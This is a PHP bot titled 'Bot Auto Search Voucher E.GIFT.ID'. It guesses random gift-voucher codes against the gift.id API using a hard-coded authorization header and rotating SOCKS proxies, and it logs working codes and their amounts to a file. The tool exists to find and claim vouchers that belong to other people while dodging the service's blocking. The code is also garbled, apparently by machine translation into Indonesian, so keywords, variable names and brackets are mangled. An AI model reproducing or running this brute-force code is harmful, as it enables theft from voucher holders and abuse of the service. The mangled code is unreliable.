<? php 
$ headers  =  array (); 
$ headers []  =  "Tingkatkan-Permintaan-Aman: 1" ; 
$ headers []  =  "Agen-Pengguna: Mozilla / 5.0 (Windows NT 6.1) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 70.0.3538.102 Safari / 537.36" ; 
$ headers []  =  "Connection: keep-alive" ; 
$ headers []  =  "Accept: application / json, text / plain, * / *" ; 
$ headers []  =  "Accept-Language: id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7" ; 
$ headers []  = "Cookie: __cfduid = d91ca80891bc74213ccf2d51354e3b6cd1542347945" ; 
$ headers []  =  "If-None-Match: ^^ e9ed713183286a0d2ba736b8bb2a8d9e ^^ \" \ " " ; 
$ headers []  =  "If-Modified-Since: Sen, 12 Nov 2018 04:06:37 GMT" ; 
$ headers []  =  "Referer: https://e.gift.id/u/83f5vbm5bdb46" ; 
$ headers []  =  "Access-Control-Request-Method: GET" ; 
$ headers []  =  "Asal: https://e.gift.id" ; 
$ headers []  =  "Otoritas: api.gift.id" ;
 =  "Akses-Kontrol-Permintaan-Header: otorisasi" ; 
$ headers []  =  "Otorisasi: Basic VHRSczgwU2dEd0VjSVpMdnliZGRYS2RmaTpJWFVseHQ1cEdjNUZVRXZKY1JNdnpiTUFHanRHNk5nU0tYZm16SzBiUE1iVjhjcGVPUQ ==" ; 
echo  "Bot Auto Search Voucher E.GIFT.ID \ n " ; 
echo  "YarzCode - Meds \ n \ n " ; 
$ socks  =  meledak ( " \ n " ,  file_get_contents ( "socks.txt" )); 
$ i = 0 ;
  ) 
{  
while ( true ) 
{  
$ code   =  "83" . acak () . "46" ; 
$ kirik  =  curl ( 'https://api.gift.id/v1/egifts/detail_by_code/' . $ code ,  null ,  $ headers ,  $ proxy ); 
if ( preg_match ( '/ Akses ditolak /' ,  $ kirik [ 0 ])) 
{  
	break ; 
	lanjutkan ; 
} 
$ np     =  @ json_decode( $ kirik [ 0 ]); 
if ( ! isJson ( $ kirik [ 0 ]))  {  
    break ; 
    lanjutkan ; 
}  else  if ( empty ( @ $ np -> message )) 
{  
	if ( @ $ np -> status  ==  'used' ) 
	{  
		$ status  =  'Bisa menggunakan' ; 
	}  else  {  
		$ status  =  'Perlu mengaktifkan' ; 
	}
	Jumlah $  =  @ $ np -> jumlah ; 
	if ( empty ( $ amount )) 
	{ 
	echo  "[ $ i ] DIE => https://e.gift.id/u/ { $ code } [" . $ np -> pesan . "]" . PHP_EOL ; 
	}  else  {  
	file_put_contents ( "logtada.txt" ,  " \ n https://e.gift.id/u/ { $ code } | Jumlah: { $ jumlah } | Status:{ $ status } " ,  FILE_APPEND ); 
	echo  " [ $ i ] LIVE => https://e.gift.id/u/ { $ code } [ $ amount ] [ $ status ] " . PHP_EOL ; 
    } 
}  else  { 
		echo  "[ $ i ] DIE => https://e.gift.id/u/ { $ code } [" . @ $ np -> message . "]" . PHP_EOL ; 
} 
$ i ++ ; 
} 
} 
function random ( $ length  =  9 )  { 
    $ characters  =  '0123456789abcdefghijklmnopqrstuvwxyz' ; 
    $ charactersLength  =  strlen ( $ karakter ); 
    $ randomString  =  '' ; 
    untuk  ( $ i  =  0 ;  $ i  <  $ length ;  $ i ++ )  { 
        $ randomString  . =  $ characters [ rand ( 0 ,  $ charactersLength  -  1 )]; 
    } 
    kembali $ randomString ; 
} 
function  isJson ( $ string )  { 
    return  (( is_string ( $ string )  && 
            ( is_object ( json_decode ( $ string ))  || 
            is_array ( json_decode ( $ string ))))))  ?  benar  :  salah ; 
} 
fungsi  curl ( $ url ,  $ fields  =  null ,  $ headers  =  null ,  $ proxy= null ) 
    { 
        $ ch  =  curl_init (); 
        curl_setopt ( $ ch ,  CURLOPT_URL ,  $ url ); 
        curl_setopt ( $ ch ,  CURLOPT_RETURNTRANSFER ,  true ); 
        curl_setopt ( $ ch ,  CURLOPT_FOLLOWLOCATION ,  true ); 
        curl_setopt ( $ ch ,  CURLOPT_SSL_VERIFYPEER ,  false ); 
        if  ( $ fields  ! ==  null )  { 
            curl_setopt( $ ch ,  CURLOPT_POST ,  1 ); 
            curl_setopt ( $ ch ,  CURLOPT_POSTFIELDS ,  $ fields ); 
        } 
        if  ( $ headers  ! ==  null )  { 
            curl_setopt ( $ ch ,  CURLOPT_HTTPHEADER ,  $ headers ); 
        } 
        if  ( $ proxy  ! ==  null ) 
        {  
            curl_setopt ( $ ch ,  CURLOPT_PROXY ,  $ proxy ); 
           curl_setopt ( $ ch,  CURLOPT_PROXYTYPE ,  CURLPROXY_SOCKS4 ); 
        } 
        $ hasil    =  curl_exec ( $ ch ); 
        $ httpcode  =  curl_getinfo ( $ ch ,  CURLINFO_HTTP_CODE ); 
        curl_close ( $ ch ); 
        
        return  array ( 
            hasil $ , 
            $ httpcode 
        ); 
 }